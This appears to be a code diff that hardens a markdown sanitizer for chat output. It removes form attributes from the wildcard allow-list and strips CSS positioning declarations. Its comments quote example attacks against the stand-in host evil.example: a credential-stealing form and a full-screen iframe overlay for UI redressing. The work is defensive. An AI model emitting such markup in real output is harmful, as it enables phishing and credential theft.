@@ -292,6 +292,45 @@ export function buildSanitizeSchema(options: BuildSanitizeSchemaOptions = {}) {
     if (lower !== tag) attributes[lower] = [...(attributes[lower] ?? []), ...SVG_ATTRIBUTES]
   }
 
+  // MAKE THE PER-TAG LISTS ACTUALLY AUTHORITATIVE.
+  //
+  // `hast-util-sanitize` looks a property up in `attributes[tagName]` and, when
+  // it is ABSENT there, RETRIES against `attributes['*']` (see its
+  // `properties()`). A per-tag list therefore narrows nothing on its own — it
+  // only ADDS. defaultSchema (GitHub's schema) puts the whole form vocabulary
+  // on `*` — `action`, `method`, `encType`, `name`, `value`, `size`,
+  // `maxLength`, `readOnly`, `accept`, `multiple` — so the `input` entry above,
+  // documented as "EXACTLY the GFM task-list contract and nothing else", was
+  // inert: `<input name="password" size="40">` kept both attributes.
+  //
+  // Verified consequence before this filter: the markdown
+  //   <form action="https://evil.example/steal" method="post">
+  //     <input name="email"><input name="password">
+  //     <button type="submit">Sign in</button></form>
+  // rendered VERBATIM on the CHAT surface — a working cross-origin credential
+  // form inside trusted app chrome, from untrusted model output, one click from
+  // submitting. `form` has no per-tag entry at all, so it took `action`/`method`
+  // straight from `*`.
+  //
+  // Stripping these from `*` leaves every legitimate use intact, because the
+  // tags that genuinely need them declare them per-tag (`button`, `select`,
+  // `option`, `textarea` for `name`/`value`, `input` for `checked`).
+  //
+  // The two non-form uses that in principle relied on `*` — `<a name="anchor">`
+  // and `<li value="3">` — were checked and need NO re-declaration: the base
+  // `a` / `li` renderers build their own elements and never forwarded either
+  // attribute, so neither reached the DOM before this filter (verified by
+  // reverting it). Pinned by ./__tests__/sanitize-render.test.tsx so the fact
+  // stays recorded rather than re-derived.
+  const STAR_FORM_ATTRIBUTES = new Set([
+    'action', 'method', 'encType', 'name', 'value',
+    'size', 'maxLength', 'readOnly', 'accept', 'acceptCharset', 'multiple', 'prompt',
+  ])
+  attributes['*'] = (attributes['*'] ?? []).filter((attr) => {
+    const key = Array.isArray(attr) ? attr[0] : attr
+    return !STAR_FORM_ATTRIBUTES.has(key as string)
+  })
+
   // SVG-only tags are pinned to an `svg` ancestor (canonical AND lowercase
   // spelling, matching the tagNames treatment above) so a bare `<title>` /
   // `<text>` / `<g>` in prose is DROPPED instead of hijacking the page.
@@ -333,6 +372,17 @@ export function buildSanitizeSchema(options: BuildSanitizeSchemaOptions = {}) {
 // pre-unification SimpleMarkdownRenderer)
 // ---------------------------------------------------------------------------
 const EVENT_HANDLER_ATTR_RE = /^on[a-z]+$/i
+
+/**
+ * CSS declarations that take an element OUT of the document flow, i.e. the
+ * primitive every UI-redress payload needs. Matched per declaration (the
+ * `style` attribute is split on `;` first), so decorative styling on the same
+ * element is preserved. `inset` and the individual offsets are included because
+ * `position` alone is not the only lever — a `position:sticky` left behind with
+ * `top:0;z-index:…` still floats content over the page.
+ */
+const POSITIONING_DECL_RE =
+  /(?:^|[\s;])(?:position|z-index|inset(?:-block|-inline)?(?:-start|-end)?|top|right|bottom|left)\s*:/i
 const JAVASCRIPT_URL_RE = /^[\s\x00-\x1f]*javascript:/i
 const DATA_URL_RE = /^[\s\x00-\x1f]*data:/i
 const URL_ATTRS = new Set([
@@ -414,6 +464,41 @@ export function rehypeStripUnsafe() {
         }
         if (tag === 'iframe' && key.toLowerCase() === 'srcdoc') {
           delete node.properties[key]
+          continue
+        }
+        // OVERLAY / UI-REDRESS GUARD. `style` is allowed (a content audit found
+        // real published posts relying on it for `div.takeaway`, table styling
+        // and reddit blockquotes), but the positioning subset of CSS is not a
+        // decoration — it is a way to lift untrusted markup out of the message
+        // body and put it over the whole application. Verified before this
+        // guard: a single chat message containing
+        //   <iframe src="https://evil.example/phish"
+        //           style="position:fixed;top:0;left:0;width:100vw;height:100vh;
+        //                  z-index:2147483647">
+        // rendered an attacker-controlled cross-origin document covering the
+        // entire viewport above every piece of app chrome (toasts at z-9999
+        // included); the `<span style="position:fixed;inset:0">` variant does the
+        // same with no frame at all. Chat content is model output, so this is
+        // reachable from untrusted input.
+        //
+        // Only the escape-the-flow declarations are dropped, and per-declaration
+        // rather than by discarding the whole attribute, so ordinary decorative
+        // styling on the same element survives. THE TRADE-OFF, STATED: authored
+        // content that legitimately wanted `position:sticky` (a pinned table
+        // header, say) loses it — deliberately, because there is no way to tell
+        // it apart from the redress payload at this layer, and a sticky header is
+        // a smaller loss than a full-page phishing surface.
+        if (key.toLowerCase() === 'style') {
+          const raw = node.properties[key]
+          if (typeof raw === 'string' && POSITIONING_DECL_RE.test(raw)) {
+            const cleaned = raw
+              .split(';')
+              .filter((decl) => !POSITIONING_DECL_RE.test(decl))
+              .join(';')
+              .trim()
+            if (cleaned === '' || cleaned === ';') delete node.properties[key]
+            else node.properties[key] = cleaned
+          }
         }
       }
     })
